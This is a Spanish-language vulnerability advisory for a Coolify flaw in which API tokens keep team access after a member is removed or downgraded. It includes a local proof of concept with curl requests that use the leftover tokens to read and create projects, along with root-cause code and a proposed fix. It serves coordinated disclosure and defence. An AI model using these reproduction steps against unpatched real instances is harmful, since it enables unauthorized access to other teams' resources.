# CVE-2026-53770: Los Personal Access Tokens de Coolify retienen abilities team-scoped después del removal del member o del downgrade de rol

**Publicado:** 2026-07-28 **Reportado:** 2026-05-22 **Severidad:** 7.7 Alta (hasta 8.8+ para tokens minted por owners) **Estado:** Corregido en PR #10505 **CWEs:** CWE-613 (Insufficient Session Expiration) + CWE-672 (Operation on a Resource after Expiration or Release) + CWE-863 (Incorrect Authorization)

---

Un Personal Access Token de Coolify minted por un member de un team mantiene su binding a `team_id` y sus `abilities` más allá del removal del usuario de ese team y más allá del downgrade de rol del usuario. La REST API y el servidor MCP autorizan requests leyendo el `team_id` del token directo, sin chequear si el usuario sigue siendo member de ese team. Un ex-member con un token previamente emitido sigue leyendo y modificando los recursos del team.

El patrón que el codebase ya implementa para sesiones web (validar la membership del pivot en vivo en cada call) se aplica a un path de resolución de team y se skipea en el otro, contra el mismo estado de la DB.

---

## Reproducción en vivo

Stack dev v4.1.0 recién buildeado. `InstanceSettings.is_api_enabled = true`, `is_mcp_server_enabled = true`. Team `PocTeam` (id 4) con `AdminA` como owner y `UserB` como `admin`. `AdminA` había creado previamente un proyecto baseline llamado `PocTeam-baseline`.

`UserB` mintea tres PATs por el path de código de producción (UI Livewire `Security > API Tokens > Create Token`), que llama a `App\Livewire\Security\ApiTokens::addNewToken` en `app/Livewire/Security/ApiTokens.php:106`, que llama a `auth()->user()->createToken($description, $permissions, $expiresAt)`, que escribe la fila con `team_id = session('currentTeam')->id`.

`AdminA` entonces remueve a `UserB` de `PocTeam` vía la UI de admin, que llama a `Member::remove` en `app/Livewire/Team/Member.php:65-83`:

```
$ docker compose exec -T coolify php artisan tinker --execute "..."
before: UserB role in PocTeam = admin
before: UserB has 3 tokens bound to team_id=4
detach() done
after : UserB role in PocTeam = NULL (removed)
after : UserB tokens bound to team_id=4 = 3
DELTA: tokens revoked = 0
```

`UserB` queda detached del pivot. Cero de los tres PATs de `UserB` son revocados.

El token con read-ability, después del removal, lee el proyecto del team:

```
$ curl -sS -i -H "Authorization: Bearer 23|S2bqD0Okyp8xmvBlpjXbFgzsvi884XJb86WMmbAlfd6b0921" \
       -H "Accept: application/json" \
       http://localhost:8765/api/v1/projects
HTTP/1.1 200 OK
...
[{"id":13,"uuid":"e5jt66q6hamphwvq7k37wm0w",
  "description":"created by AdminA before UserB was removed",
  "name":"PocTeam-baseline"}]
```

El mismo token lee el team vía MCP `list_projects` y devuelve el mismo proyecto.

El token con write-ability, después del removal, crea un proyecto nuevo bajo el team:

```
$ curl -sS -i -X POST \
       -H "Authorization: Bearer 24|fO9p0O0PQkj1yUDMg0HDQHAoCvHXU7zrvUfqjDLq3ad1e0f6" \
       -H "Accept: application/json" \
       -H "Content-Type: application/json" \
       --data '{"name":"after-removal-mutation","description":"created by ex-member as PoC"}' \
       http://localhost:8765/api/v1/projects
HTTP/1.1 201 Created
...
{"uuid":"sia3illb0byt6gqwj6fspuv4"}
```

El tool MCP `get_infrastructure_overview` devuelve el overview completo del team al ex-member.

## El role downgrade dispara el mismo gap

`UserB` se re-attachea a `PocTeam` como `admin`, después se downgradea a `member` vía `Member::makeReadonly` en `app/Livewire/Team/Member.php:49-63`. El token con write-ability, minted mientras `UserB` era `admin`, sigue mutando el team después del downgrade:

```
$ docker compose exec -T coolify php artisan tinker --execute "..."
UserB re-attached as admin
before downgrade: UserB role = admin
after  downgrade: UserB role = member

$ curl -sS -i -X POST \
       -H "Authorization: Bearer 24|fO9p0O0PQkj1yUDMg0HDQHAoCvHXU7zrvUfqjDLq3ad1e0f6" \
       ...
       --data '{"name":"role-downgrade-mutation","description":"created by demoted ex-admin"}' \
       http://localhost:8765/api/v1/projects
HTTP/1.1 201 Created
...
{"uuid":"gtwowpxprb0dzs38c0in1tnz"}
```

Las abilities del token quedaron fijadas al momento del mint y no se re-evalúan sobre el nuevo rol. La gate de UI que previene que usuarios con rol `member` hagan operaciones de write queda bypaseada vía el token.

## Root cause

El mint bindea `team_id` a session-time (`app/Models/User.php:212-230`):

```php
public function createToken(string $name, array $abilities = ['*'], ?DateTimeInterface $expiresAt = null)
{
    ...
    $token = $this->tokens()->create([
        'name' => $name,
        'token' => hash('sha256', $plainTextToken),
        'abilities' => $abilities,
        'expires_at' => $expiresAt,
        'team_id' => session('currentTeam')->id,
    ]);
    ...
}
```

El detach de membership no toca tokens (`app/Livewire/Team/Member.php:65-83`):

```php
public function remove()
{
    ...
    $this->member->teams()->detach(currentTeam());
    Cache::forget("team:{$this->member->id}");
    Cache::forget("user:{$this->member->id}:team:{$teamId}");
    $this->dispatch('reloadWindow');
    ...
}
```

El role downgrade tampoco toca tokens (`app/Livewire/Team/Member.php:17-63`).

El consumo del token lee el campo estático `team_id` en la REST API (`bootstrap/helpers/api.php:10-15`):

```php
function getTeamIdFromToken()
{
    $token = auth()->user()->currentAccessToken();
    return data_get($token, 'team_id');
}
```

El consumo de MCP sigue la misma forma (`app/Mcp/Concerns/ResolvesTeam.php:29-34`):

```php
protected function resolveTeamId(Request $request): ?int
{
    $token = $request->user()?->currentAccessToken();
    return $token?->team_id;
}
```

`auth:sanctum` es Sanctum stock y solo valida que la fila del token exista y que no esté expirada. `app/Http/Middleware/ApiAbility.php` chequea las abilities del token pero no la membership actual del usuario en el team. Ninguno de los middleware en el path del token verifica si `request()->user()` sigue siendo member de `request()->user()->currentAccessToken()->team_id`.

## El codebase ya implementa el check faltante en el path de sesión

La misma auth chain tiene dos mecanismos de resolución de team. El basado en sesión valida la membership del pivot en vivo en cada call:

```php
// app/Models/User.php:328-347
public function currentTeam(): ?Team
{
    $sessionTeamId = data_get(session('currentTeam'), 'id');

    if (is_null($sessionTeamId)) {
        return null;
    }

    // Check if user actually belongs to this team
    if (! $this->teams->contains('id', $sessionTeamId)) {
        session()->forget('currentTeam');
        Cache::forget('user:'.$this->id.':team:'.$sessionTeamId);

        return null;
    }

    return Cache::remember('user:'.$this->id.':team:'.$sessionTeamId, 3600, function () use ($sessionTeamId) {
        return Team::find($sessionTeamId);
    });
}
```

Este es el helper que backea la función global `currentTeam()` y el endpoint `/api/v1/teams/current`. Cuando `UserB` es removido de `PocTeam` y el mismo token llega a `TeamController::current_team`, `currentTeam()` corre, encuentra `! $this->teams->contains('id', 4)`, olvida el cache, devuelve `null`, y el controller devuelve 404. Ese endpoint está correctamente defendido.

El helper de resolución de token `getTeamIdFromToken()` no corre este check; devuelve el campo estático `team_id` de la fila del token. El resto de la REST API y toda la superficie MCP rutean por `getTeamIdFromToken()` (o su gemelo MCP `ResolvesTeam::resolveTeamId`), no por `currentTeam()`. La misma pregunta lógica, "¿sigue este usuario perteneciendo a este team?", se responde correctamente en un path y se skipea en el otro, contra el mismo estado de DB.

Esa es la evidencia más fuerte de que el gap es implementación, no diseño. El patrón de validación de membership ya existe en el codebase; se aplicó a un path de resolución de team y no al otro.

## Lifecycle gap, más ancho que solo removal

Grepeando cada path de código que muta la relación user-team o rota las credenciales del usuario, escrito como `<trigger> (file:line), sesión web: <revocada?>, PAT Sanctum: <revocado?>`:

- **Admin remueve member** (`app/Livewire/Team/Member.php:65-83`): sesión web no revocada; PAT no revocado.
- **Owner borra team, efecto en otros members** (`app/Livewire/NavbarDeleteTeam.php:18-41`): sesión web revocada en líneas 32-35; PAT no revocado.
- **Role downgrade** (`app/Livewire/Team/Member.php:17-63`, métodos `makeReadonly` / `makeAdmin` / `makeOwner`): sesión web no revocada; PAT no revocado.
- **Usuario cambia password** (`app/Traits/DeletesUserSessions.php:26-32`): sesión web revocada; PAT no revocado.
- **Usuario borra cuenta hard-delete** (`app/Models/User.php:106-157`): sesión web N/A; PAT queda huérfano vía la resolución polimórfica `tokenable` de Sanctum devolviendo null, así que el token deja de autenticar como side effect en vez de por diseño.

El path de team-delete borra explícitamente las filas de sesión en DB para los members afectados en `NavbarDeleteTeam.php:32-35`. Ese código es evidencia directa de que revocar acceso requiere revocar credenciales. El vector del token Sanctum se perdió en ese path y en todos los paths de la tabla.

## Por qué "bearer trusts bearer" no aplica

El modelo bearer es correcto solo mientras el bearer sigue teniendo entitlement. El mint path codifica el binding al team en la fila del token precisamente para que el enforcement del team-scoping no dependa del pivot `team_user` en vivo. Los cambios de membership son un flujo de producto rutinario: los admins remueven members, los owners degradan admins a members, las cuentas se revocan. Cada uno es una intención explícita de remover acceso, y Coolify ya implementa esa intención para sesiones web en dos de los cinco lifecycle paths. La expectativa de que el acceso basado en token siga la misma intención está establecida por el propio codebase.

## Dirección del fix

Fix mínimo: revocar los PATs del usuario bindeados al team afectado en los mismos code paths que hacen detach del usuario o cambian su rol:

```php
// app/Livewire/Team/Member.php  (dentro de remove(), makeReadonly(), makeAdmin(), makeOwner())
\Laravel\Sanctum\PersonalAccessToken::query()
    ->where('tokenable_type', \App\Models\User::class)
    ->where('tokenable_id', $this->member->id)
    ->where('team_id', currentTeam()->id)
    ->delete();
```

El mismo call dentro de `NavbarDeleteTeam::delete()` para los PATs del team, y dentro de `DeletesUserSessions::bootDeletesUserSessions` para los PATs del usuario en cambio de password. La columna `personal_access_tokens.team_id` ya provee los datos necesarios para un delete scoped eficiente.

Una alternativa de defense-in-depth: agregar un middleware después de `auth:sanctum` que compare `$request->user()->teams->pluck('id')` contra `$request->user()->currentAccessToken()->team_id` y devuelva 401 en mismatch. Eso pone el enforcement en el consumo en vez de en los eventos de lifecycle y cubre cualquier futuro code path que haga detach del usuario.

## Divulgación

Reportado privadamente a Coolify contra `v4.1.0` (commit `49656aa1edbe8aa6f7f7077dbf689cb1a08f05ee`). Corregido upstream en [PR #10505](https://github.com/coollabsio/coolify/pull/10505). CVE-2026-53770 asignado por GitHub el 2026-06-10.

Gracias a Andras y al equipo de Coolify por el triage rápido y el fix.

## Links

- CVE record: https://www.cve.org/CVERecord?id=CVE-2026-53770
- Fix PR: https://github.com/coollabsio/coolify/pull/10505
- Coolify: https://github.com/coollabsio/coolify
- Docs de Sanctum PATs: https://laravel.com/docs/12.x/sanctum#api-token-authentication
- CWE-613: https://cwe.mitre.org/data/definitions/613.html
- CWE-672: https://cwe.mitre.org/data/definitions/672.html
- CWE-863: https://cwe.mitre.org/data/definitions/863.html
